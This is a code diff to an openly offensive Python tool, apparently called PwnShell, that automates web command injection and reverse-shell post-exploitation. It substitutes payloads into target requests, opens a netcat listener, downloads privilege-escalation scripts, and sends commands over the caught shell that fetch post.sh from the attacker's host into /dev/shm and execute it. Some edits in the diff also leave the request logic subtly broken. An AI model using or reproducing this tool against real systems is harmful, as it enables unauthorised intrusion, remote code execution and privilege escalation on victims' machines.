@@ -43,11 +43,10 @@ class PwnShell:
         ######################################################################
 
     def info(self):
-        info = {'[*]LOCAL IP ADDRESS': self.ip, '[*]LOCAL PORT': self.port, '[*]Domain':self.domain, '[*]Method':self.method, '[*]Post Data':self.data,
-                '[*]Payload Type':self.type, '[*]Request file':self.file, '[*]Use nodejs payloads':self.nodejs}
-        for key, value in info.items():
-            if value:
-                print(f'{key} : {value}')
+        print('[*]LOCAL IP ADDRESS : %s' % self.ip)
+        print('[*]LOCAL PORT : %s' % self.port)
+        if self.domain:
+            print('[*]TARGET URL : %s' % self.domain)
 
     ####################################################################################
     ###################################  LINUX #########################################
@@ -82,14 +81,15 @@ class PwnShell:
     ##############################  NC LISTNER + STAGER ###################################
 
     def listener(self):  # setting up the nc listener & stablizing the shell then uploading linpeas to /dev/shm
-        print('\n[!]Waiting for a Connection ....\n')
         nc = nclib.Netcat(listen=('', self.port))
-        print('\n[*]Downloading PrivESC Scripts From Github..')
-        os.system(
-            'curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -o linpeas.sh 2>/dev/null ; curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o LinEnum.sh 2>/dev/null ; curl https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -o linux-exploit-suggester.sh  2>/dev/null ; curl https://raw.githubusercontent.com/flast101/docker-privesc/master/docker-privesc.sh -o docker-privesc.sh 2>/dev/null')
+        print(f"[*]Got Connection From -> [{self.ip}:{self.port}]")
+        print('[*]Uploading Shell Script to [/dev/shm]...')
+        os.system('curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -o linpeas.sh 2>/dev/null ; curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o LinEnum.sh 2>/dev/null ; curl https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -o linux-exploit-suggester.sh  2>/dev/null ; curl https://raw.githubusercontent.com/flast101/docker-privesc/master/docker-privesc.sh -o docker-privesc.sh 2>/dev/null')
+        time.sleep(3)
+        print('[*]Auto Stablizing & Uploading PrivESC Scripts works for [bash/sh] Shells for Now...')
         time.sleep(5)
         nc.send_line(b"export TERM=xterm-256color")
-        send = f'''wget -P /dev/shm http://{self.ip}:9002/post.sh ; clear'''
+        send = f'''wget -P /dev/shm http://{self.ip}:9002/post.sh'''
         nc.send_line(send.encode("utf-8"))
         send = f'''chmod +x /dev/shm/post.sh ; clear ; /dev/shm/post.sh {self.ip}'''
         nc.send_line(send.encode("utf-8"))
@@ -144,24 +144,26 @@ class PwnShell:
     def send_request(self, payload):
         if self.domain:
             encoded_payload = self.get_url_encoded_payload(payload)
-            print(f'Trying: {payload}')
             url = self.domain.replace('PWNME', encoded_payload)
+            #print(url)
             proxies = {'http': 'http://127.0.0.1:8080'}
             headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0",
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                        "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
                        "Upgrade-Insecure-Requests": "1",
                        'Content-Type': 'application/x-www-form-urlencoded'}  # Don't Change*
-            cookies = ''
+            cookies =''
             if self.method == 'post' or self.method == 'POST':
                 if self.data:
-                    data_parsed = self.data.replace("PWNME", encoded_payload)  # Don't chang
+                    data_parsed = self.data.replace("PWNME", encoded_payload)  # Don't change
+                    print("\n[+]Stauts Code ->","["+f'{r.status_code}'+"]")
                 else:
                     data_parsed = None
-                r = requests.post(url, headers=headers, data=data_parsed,
-                                  cookies=cookies, verify=False)
+                    r = requests.post(url, headers=headers, data=data_parsed,cookies=cookies, verify=False)
+                    print("\n[+]Stauts Code ->","["+f'{r.status_code}'+"]")
             else:
                 r = requests.get(url, cookies=cookies, verify=False)
+                print("\n[+]Stauts Code ->","["+f'{r.status_code}'+"]")
 
     ########################################################################################
     ###################################  PARSER BURPREQUEST #################################
@@ -170,7 +172,7 @@ class PwnShell:
         for payload in payloads:
             proxies = {'http': 'http://127.0.0.1:8080'}
             encoded_payload = self.get_url_encoded_payload(payload)
-            request, post_data = burpee.parse_request(self.file)  # Don;t change
+            request, post_data = burpee.parse_request(self.file)  # Don't change
             for r in request:
                 if request[r] == "PWNME":
                     request[r] = request[r].replace("PWNME", encoded_payload)  # THE PAYLOAD
@@ -185,10 +187,9 @@ class PwnShell:
                 print(encoded_payload)
             else:
                 url = url.replace("PWNME", encoded_payload)
-                print(url)
-                req = requests.get(url, headers=request, verify=False)
-                print(req.status_code)
-            time.sleep(2)
+                req = requests.get(url, headers=request,verify=False)
+                print("\n[+]Stauts Code ->","["+f'{req.status_code}'+"]")
+                time.sleep(2)
 
     #########################################################################################
     ###################################  ENCODING PAYLOADS #################################
@@ -231,7 +232,7 @@ if __name__ == '__main__':
         parser.add_argument("-d", "--data", help='Post data')
         parser.add_argument("-c", "--cookie", help='Enter Cookie')
         parser.add_argument("-k", "--header", help='Provide header')
-        parser.add_argument("-m", "--method", help='Request Method', default='post')
+        parser.add_argument("-m", "--method", help='Request Method',required=True)
         args = parser.parse_args()
         ########################################################################
         ########################## Defining variables ##########################
@@ -241,6 +242,4 @@ if __name__ == '__main__':
         exit_gracefully()
 
 # TODO
-# Add login form with a session
-# Stop loop when getting a connection
 # Work on windows
